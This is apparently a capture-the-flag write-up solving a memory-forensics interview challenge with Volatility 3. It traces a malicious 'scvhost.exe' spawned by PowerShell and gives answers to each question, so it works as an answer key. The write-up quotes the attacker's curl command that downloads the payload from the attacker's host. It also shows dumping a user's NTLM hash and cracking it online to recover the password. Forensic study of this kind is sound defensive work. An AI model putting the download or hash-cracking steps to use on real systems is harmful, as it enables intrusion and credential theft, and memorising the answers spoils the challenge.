# Mellitus

## Speech
```
You’ve been a SOC analyst for the last 4 years but you’ve been honing your incident response skills! It’s about time you bite the bullet and go for your dream job as an Incident Responder as that’s the path you’d like your career to follow. Currently you are going through the interview process for a medium size incident response internal team and the cocky interviewing responder has given you a tough technical challenge to test your memory forensics aptitude. Can you get all the questions right and secure the job?
```

## Analysis
1. Looks like vm snapshot :
```
memory_dump.vmem: Windows Event Trace Log
memory_dump.vmsn: data
```
2. Looks like we can analyse with volatility...
3. Beginning with cmdline module : `/opt/volatility3/vol.py -f ./memory_dump.vmem windows.cmdline` (why ? To see weird launched process easily, process list are often too big and hard to look at)
    - I just put a little part of the output because they are a lot of things in this capture
    ```
    11204	httpd.exe	c:\xampp\apache\bin\httpd.exe
    9128	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
    5212	mysqld.exe	"c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone
    9652	httpd.exe	C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
    11048	FileZillaServe	c:\xampp\filezillaftp\filezillaserver.exe -compat -start
    4276	cmd.exe	"C:\Windows\sysnative\cmd.exe" /c "c:\xampp\catalina_start.bat"
    8568	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
    2696	java.exe	"C:\Program Files\Java\jdk-20\bin\java.exe"  -Djava.util.logging.config.file="C:\xampp\tomcat\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager  -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources   -Dignore.endorsed.dirs="" -classpath "C:\xampp\tomcat\bin\bootstrap.jar;C:\xampp\tomcat\bin\tomcat-juli.jar" -Dcatalina.base="C:\xampp\tomcat" -Dcatalina.home="C:\xampp\tomcat" -Djava.io.tmpdir="C:\xampp\tomcat\temp" org.apache.catalina.startup.Bootstrap  start
    1272	dllhost.exe	C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
    10048	cmd.exe	"C:\Windows\system32\cmd.exe" 
    10040	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
    9872	FileZilla Serv	"C:\xampp\filezillaftp\filezilla server interface.exe" 
    9880	FileZilla Serv	"C:\xampp\filezillaftp\filezilla server interface.exe" 
    8188	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc
    5708	chrome.exe	"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=audio.mojom.AudioService --lang=en-GB --service-sandbox-type=audio --mojo-platform-channel-handle=6532 --field-trial-handle=2084,i,1830137358761159386,540347442219807616,262144 /prefetch:8
    6772	powershell.exe	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
    4532	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
    4964	chrome.exe	"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --disable-nacl --origin-trial-disabled-features=WebGPU --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=59 --time-ticks-at-unix-epoch=-1698759050284302 --launch-time-ticks=800723363 --mojo-platform-channel-handle=6588 --field-trial-handle=2084,i,1830137358761159386,540347442219807616,262144 /prefetch:1
    5116	mspaint.exe	"C:\Windows\system32\mspaint.exe" 
    ```
    - We can see an xampp server (httpd, mysql, etc.) on the machine
    - We also see powershell.exe which is interesting
4. Then we can look at the process tree and focus on what could be intersting from what we saw previously :
    - The command : `/opt/volatility3/vol.py -f ./memory_dump.vmem windows.pstree`
    ```
    ******* 6772	1424	powershell.exe	0xc40aa9de7080	11	-	4	False	2023-10-31 13:42:21.000000 	N/A	\Device\HarddiskVolume4\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    ******** 11156	6772	scvhost.exe	0xc40aa8cc8080	0	-	4	True	2023-10-31 13:50:20.000000 	2023-10-31 13:51:36.000000 	\Device\HarddiskVolume4\Users\BantingFG\Downloads\scvhost.exe	-	-
    ******** 4532	6772	conhost.exe	0xc40aaa8de4c0	3	-	4	False	2023-10-31 13:42:22.000000 	N/A	\Device\HarddiskVolume4\Windows\System32\conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4	C:\Windows\system32\conhost.exe
    ```
5. To take a look at what the powershell do I try to recover the history file but she is not here
    - So let's recover the evtx to see if we have something in it : `/opt/volatility3/vol.py -f ./memory_dump.vmem windows.dumpfile --virtaddr 0xc40aab362c20` --> the virtaddr is the one of the `\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx` file
    - Nothing in it !


## Questions
1. What was the time on the system when the memory was captured?
    > 2023-10-31 13:59:26
    - Using : `/opt/volatility3/vol.py -f ./memory_dump.vmem windows.info`
    - We have the **systemTime**  which correspond to the time of the system at the time of the dump, newest time
2. What is the IP address of the attacker?
    > 192.168.157.151
    - I used : `/opt/volatility3/vol.py -f ./memory_dump.vmem windows.netscan`
    - I saw one **ESTABLISHED** with a port different than 443
3. What is the name of the strange process?
    > Scvhost.exe
    - cf. Analysis > 4
4. What is the PID of the process that launched the malicious binary?
    > 6772
    - cf. Analysis > 3
    - PID of the powershell process
5. What was the command that got the malicious binary onto the machine?
    > curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
    - I didn't find the command but doing that gave it to me : `strings memory_dump.vmem| grep -i 'scvhost'`
6. The attacker attempted to gain entry to our host via FTP. How many users did they attempt?
    > 3
    - In order to find this : `strings memory_dump.vmem| grep -i -a20 -b20 '331 Password required for'`
7. What is the full URL of the last website the attacker visited?
    > https://stackoverflow.com/questions/38005341/the-response-content-cannot-be-parsed-because-the-internet-explorer-engine-is-no
    - I downloaded the following files : `0xc40aa9259df0 \Users\BantingFG\AppData\Local\Google\Chrome\User Data\Default\History	216`
    ```
    -rw------- 1 kali kali     524288 May 31 17:38  file.0xc40aa9259df0.0xc40aa4ec6be0.SharedCacheMap.History.vacb
    ```
    - Open with sqlitebrowser and we find the last visited url in the `urls` table
8. What is the affected users password?
    > flowers123
    - Using : `/opt/volatility3/vol.py -f ./memory_dump.vmem windows.hashdump`
    - We get : `BantingFG 1002 aad3b435b51404eeaad3b435b51404ee 5a4a40e43197cd4dfb7c72e691536e92`
    - Put `5a4a40e43197cd4dfb7c72e691536e92` on crackstation, we get the password of the user
9. There is a flag hidden related to PID 5116. Can you confirm what it is?
    > you_Foundme!
    - https://ctftime.org/writeup/23198
    - we saw a mspaint opened, we dump it with : `/opt/volatility3/vol.py -f ./memory_dump.vmem windows.memmap --pid 5116 --dump`
    - Then open in Gimp as `Raw Image Data`
    - Play with the `offset` `width` and `high` (my value are : 310074314 1794 1030)